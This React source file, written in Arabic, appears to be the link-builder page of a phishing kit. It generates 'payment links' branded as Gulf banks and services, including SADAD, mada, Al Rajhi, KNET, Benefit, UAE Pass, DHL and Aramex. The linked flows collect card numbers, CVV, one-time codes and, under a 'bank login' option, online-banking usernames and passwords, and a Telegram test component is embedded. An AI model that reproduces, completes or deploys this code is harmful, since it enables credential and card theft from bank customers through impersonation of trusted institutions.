import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCurrencySymbol, getCurrencyName, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import TelegramTest from "@/components/TelegramTest";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreatePaymentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");

  const [paymentAmount, setPaymentAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [paymentService, setPaymentService] = useState("sadad"); // Default to sadad
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");

  // Determine available payment services based on country
  const getPaymentServices = (countryCode: string) => {
    switch (countryCode?.toUpperCase()) {
      case 'SA':
        return [
          { key: 'sadad', name: 'سداد - SADAD', icon: '💳' },
          { key: 'mada', name: 'مدى - mada', icon: '🏦' },
          { key: 'alrajhi_bank', name: 'مصرف الراجحي', icon: '🏛️' },
          { key: 'snb', name: 'البنك الأهلي السعودي', icon: '🏛️' },
          { key: 'enbd', name: 'الإمارات دبي الوطني', icon: '🏛️' },
          { key: 'stc_pay', name: 'STC Pay', icon: '📱' },
        ];
      case 'AE':
        return [
          { key: 'jaywan', name: 'جيوان - Jaywan', icon: '💳' },
          { key: 'dirham', name: 'درهم - Dirham', icon: '💰' },
          { key: 'enbd', name: 'الإمارات دبي الوطني', icon: '🏛️' },
          { key: 'uae_pass', name: 'الهوية الرقمية UAE Pass', icon: '🆔' },
        ];
      case 'KW':
        return [
          { key: 'knet', name: 'كي نت - KNET', icon: '💳' },
          { key: 'nbk', name: 'البنك الوطني الكويتي', icon: '🏛️' },
          { key: 'dhlkw', name: 'DHL الكويت', icon: '📦' },
        ];
      case 'QA':
        return [
          { key: 'qnb', name: 'مجموعة QNB', icon: '🏛️' },
          { key: 'qatar_gov', name: 'بوابة الدفع الحكومية', icon: '🏛️' },
          { key: 'metrash2', name: 'مترش ٢ - Metrash2', icon: '📱' },
          { key: 'dhlqa', name: 'DHL قطر', icon: '📦' },
        ];
      case 'OM':
        return [
          { key: 'maal', name: 'مال - Maal', icon: '💳' },
          { key: 'bank_muscat', name: 'بنك مسقط', icon: '🏛️' },
          { key: 'dhlom', name: 'DHL عُمان', icon: '📦' },
        ];
      case 'BH':
        return [
          { key: 'benefit', name: 'بنفت - BENEFIT', icon: '💳' },
          { key: 'dhlbh', name: 'DHL البحرين', icon: '📦' },
        ];
      default:
        return [
          { key: 'sadad', name: 'سداد - SADAD', icon: '💳' },
          { key: 'aramex', name: 'أرامكس - Aramex', icon: '📦' },
        ];
    }
  };

  const paymentServices = getPaymentServices(country);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentAmount || parseFloat(paymentAmount) <= 0) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال مبلغ صحيح",
        variant: "destructive",
      });
      return;
    }

    try {
      const payload = {
        payment_amount: parseFloat(paymentAmount) || 500,
        currency_code: getCurrencyCode(country || "SA"),
        payment_method: paymentMethod,
        selectedCountry: country || "SA",
        service_key: paymentService,
        service_name: paymentServices.find(s => s.key === paymentService)?.name || paymentService,
      };

      console.log('[CreatePaymentLink] Creating link with payload:', payload);

      const link = await createLink.mutateAsync({
        type: "payment",
        country_code: country || "",
        payload: payload,
      });

      // Generate unified payment URL using the new function
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: paymentService,
        country: country || 'SA',
        amount: parseFloat(paymentAmount) || 500,
        currency: getCurrencyCode(country || "SA"),
        paymentMethod: paymentMethod,
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      toast({
        title: "تم إنشاء رابط السداد بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع العميل",
      });
    } catch (error) {
      // Error creating payment link
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط السداد",
        variant: "destructive",
      });
    }
  };


  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <CreditCard className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-4">
          <BackButton />
        </div>
        
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط سداد</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">

              {/* Payment Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ السداد
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={paymentAmount}
                  onChange={(e) => setPaymentAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Payment Service Selection (country-specific) */}
              {paymentServices.length > 1 && (
                <div>
                  <Label className="mb-3 flex items-center gap-2 text-sm font-semibold">
                    <Building2 className="w-4 h-4" />
                    بوابة الدفع *
                  </Label>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {paymentServices.map((service) => (
                      <button
                        key={service.key}
                        type="button"
                        onClick={() => setPaymentService(service.key)}
                        className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                          paymentService === service.key
                            ? 'border-primary bg-primary/5 shadow-md'
                            : 'border-border hover:border-primary/50 bg-card'
                        }`}
                      >
                        <div className="flex items-center gap-3">
                          <span className="text-2xl">{service.icon}</span>
                          <div className="flex-1">
                            <h4 className={`font-semibold text-sm mb-0.5 ${
                              paymentService === service.key ? 'text-primary' : 'text-foreground'
                            }`}>
                              {service.name}
                            </h4>
                          </div>
                          {paymentService === service.key && (
                            <div className="absolute top-2 left-2">
                              <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                                  <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                                </svg>
                              </div>
                            </div>
                          )}
                        </div>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-3 flex items-center gap-2 text-sm font-semibold">
                  <CreditCard className="w-4 h-4" />
                  طريقة الدفع *
                </Label>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  {/* Card Payment Option */}
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('card')}
                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                      paymentMethod === 'card'
                        ? 'border-primary bg-primary/5 shadow-md'
                        : 'border-border hover:border-primary/50 bg-card'
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`p-2 rounded-full ${
                        paymentMethod === 'card' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
                      }`}>
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <h4 className={`font-semibold text-sm mb-1 ${
                          paymentMethod === 'card' ? 'text-primary' : 'text-foreground'
                        }`}>
                          بيانات البطاقة
                        </h4>
                        <p className="text-xs text-muted-foreground">
                          إدخال بيانات البطاقة مباشرة
                        </p>
                        <div className="mt-2 text-xs text-muted-foreground">
                          <div className="flex items-center gap-1">
                            <span>📋</span>
                            <span>بيانات المستلم</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>💳</span>
                            <span>بيانات البطاقة</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🔐</span>
                            <span>رمز التحقق OTP</span>
                          </div>
                        </div>
                      </div>
                      {paymentMethod === 'card' && (
                        <div className="absolute top-2 left-2">
                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                            </svg>
                          </div>
                        </div>
                      )}
                    </div>
                  </button>

                  {/* Bank Login Option */}
                  <button
                    type="button"
                    onClick={() => setPaymentMethod('bank_login')}
                    className={`relative p-4 rounded-lg border-2 transition-all duration-200 text-right ${
                      paymentMethod === 'bank_login'
                        ? 'border-primary bg-primary/5 shadow-md'
                        : 'border-border hover:border-primary/50 bg-card'
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`p-2 rounded-full ${
                        paymentMethod === 'bank_login' ? 'bg-primary text-white' : 'bg-muted text-muted-foreground'
                      }`}>
                        <Building2 className="w-5 h-5" />
                      </div>
                      <div className="flex-1">
                        <h4 className={`font-semibold text-sm mb-1 ${
                          paymentMethod === 'bank_login' ? 'text-primary' : 'text-foreground'
                        }`}>
                          تسجيل دخول البنك
                        </h4>
                        <p className="text-xs text-muted-foreground">
                          تسجيل الدخول عبر البنك الإلكتروني
                        </p>
                        <div className="mt-2 text-xs text-muted-foreground">
                          <div className="flex items-center gap-1">
                            <span>📋</span>
                            <span>بيانات المستلم</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🏦</span>
                            <span>اختيار البنك</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🔑</span>
                            <span>تسجيل الدخول للبنك</span>
                          </div>
                          <div className="flex items-center gap-1 mt-1">
                            <span>🔐</span>
                            <span>رمز التحقق OTP</span>
                          </div>
                        </div>
                      </div>
                      {paymentMethod === 'bank_login' && (
                        <div className="absolute top-2 left-2">
                          <div className="w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                            </svg>
                          </div>
                        </div>
                      )}
                    </div>
                  </button>
                </div>
                
                {/* Info Box */}
                <div className={`mt-3 p-3 rounded-lg text-xs ${
                  paymentMethod === 'card' 
                    ? 'bg-blue-50 dark:bg-blue-950/20 text-blue-700 dark:text-blue-300 border border-blue-200 dark:border-blue-800'
                    : 'bg-green-50 dark:bg-green-950/20 text-green-700 dark:text-green-300 border border-green-200 dark:border-green-800'
                }`}>
                  <div className="flex items-start gap-2">
                    <span className="text-base">ℹ️</span>
                    <div>
                      {paymentMethod === 'card' ? (
                        <>
                          <p className="font-semibold mb-1">خطوات الدفع ببيانات البطاقة:</p>
                          <ol className="space-y-1 mr-4 list-decimal">
                            <li>إدخال بيانات المستلم (الاسم، رقم الجوال)</li>
                            <li>إدخال بيانات البطاقة (رقم البطاقة، تاريخ الانتهاء، CVV)</li>
                            <li>إدخال رمز التحقق OTP المرسل من البنك</li>
                          </ol>
                        </>
                      ) : (
                        <>
                          <p className="font-semibold mb-1">خطوات الدفع عبر تسجيل دخول البنك:</p>
                          <ol className="space-y-1 mr-4 list-decimal">
                            <li>إدخال بيانات المستلم (الاسم، رقم الجوال)</li>
                            <li>اختيار البنك الذي تتعامل معه</li>
                            <li>تسجيل الدخول باسم المستخدم وكلمة المرور للبنك</li>
                            <li>إدخال رمز التحقق OTP المرسل من البنك</li>
                          </ol>
                        </>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              <Button
                type="submit"
                size="lg"
                className="w-full h-11 text-white mt-6"
                style={{
                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`
                }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? "جاري الإنشاء..." : "إنشاء رابط السداد"}
              </Button>
            </form>
          </Card>
        </div>

        {/* Success Dialog */}
        <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <AlertDialogContent className="sm:max-w-md" dir="rtl">
            <AlertDialogHeader>
              <AlertDialogTitle className="text-right">✅ تم إنشاء رابط السداد بنجاح!</AlertDialogTitle>
              <AlertDialogDescription className="text-right">
                يمكنك الآن مشاركة هذا الرابط مع العميل لدفع المبلغ المطلوب
              </AlertDialogDescription>
            </AlertDialogHeader>
            <AlertDialogFooter className="flex flex-row gap-2 justify-start">
              <Button
                variant="outline"
                onClick={() => window.open(createdPaymentUrl, '_blank')}
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة الرابط
              </Button>
              <AlertDialogAction
                onClick={() => {
                  navigate(`/pay/${linkId}/data`);
                }}
                className="flex-1"
              >
                إدخال بيانات السداد
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      </div>
      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default CreatePaymentLink;
